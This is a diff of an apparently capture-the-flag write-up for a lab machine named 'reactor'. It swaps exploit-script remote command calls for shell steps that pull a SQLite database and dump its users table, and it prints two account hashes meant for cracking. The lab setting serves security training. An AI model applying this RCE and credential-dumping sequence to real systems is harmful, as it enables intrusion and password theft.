@@ -83,9 +83,8 @@ uid=999(node) gid=988(node) groups=988(node)
 ### 🗄️ Database Enumeration
 
 ```bash
-python3 react2shell-ultimate.py \
--u http://10.129.8.62:3000 \
---exec "ls -la /home/"
+cd /home
+ls -la
 ```
 
 ```bash
@@ -96,15 +95,22 @@ python3 react2shell-ultimate.py \
 ### 🧪 Read SQLite Database
 
 ```bash
-python3 react2shell-ultimate.py \
--u http://10.129.8.62:3000 \
---exec "cat /opt/reactor-app/reactor.db"
+ubuntu@target:/opt/reactor-app$ cat reactor.db
 ```
 
 ```bash
-python3 react2shell-ultimate.py \
--u http://10.129.8.62:3000 \
---exec "strings /opt/reactor-app/reactor.db | grep -E '[a-f0-9]{32}'"
+1- ubuntu@target:/opt/reactor-app$ file reactor.db
+2- ubuntu@target:/opt/reactor-app$ .download reactor.db
+3- sqlite3 reactor.db
+--> .tables
+--> .schema
+4- SELECT * FROM users;
+
+you will see these two users along with hashes, know we will crack these using tool CrackStations....
+
+1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
+2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
+
 ```
 
 ```bash
